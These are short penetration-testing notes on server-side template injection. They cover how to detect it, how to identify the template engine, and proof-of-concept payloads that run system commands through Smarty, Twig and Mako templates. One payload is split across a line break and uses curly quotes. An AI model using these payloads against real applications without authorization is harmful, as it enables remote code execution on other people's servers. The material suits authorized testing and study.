 # SSTI
 ## Detection
You can follow a similar approach when looking for template / expression language injections to the one you use when testing an application for stored XSS vulnerabilities - injecting a payload and looking for occurrences of it within the application

> If you are a user of Burp Suite Pro, you should get an extension named J2EE Scan which automatically adds tests for expression language injection

## Identify Technology
To better identify the technology, you can first:
- Observe which is the generic technology of the application. If it is java (e.g., you see it uses .jsp extensions), then you can suspect it is an expression language / OGNL.
- Use this diagram as it contains popular behavior of template engines when handling expressions.
![[Pasted image 20210602032331.png]]
- Try to inject unclosed curly braces (be careful as there is a chance you might permanently disable the attacked webpage); this might provoke verbose error disclosing the underlying technology.
- Observe other verbose errors for technology names.
- If you suspect a specific technology, Check documentation for functions specific to that technology such as PHP Twig. Php Twig Can be confirmed by
```php
{{_self.env.display("xyz")}}
```

## Exploiting Technology Specific SSTIs
### PHP
#### Smarty
```php
{php}echo `id`;{/php}
```

#### Twig
```php
{{_self.env.registerUndefinedFilterCallback(”system")}}{{_s
elf.env.getFilter(”whoami")}}
```

### Python
#### Maki
```python
<%
import os
x=os.popen('id').read()
%>
${x}
```
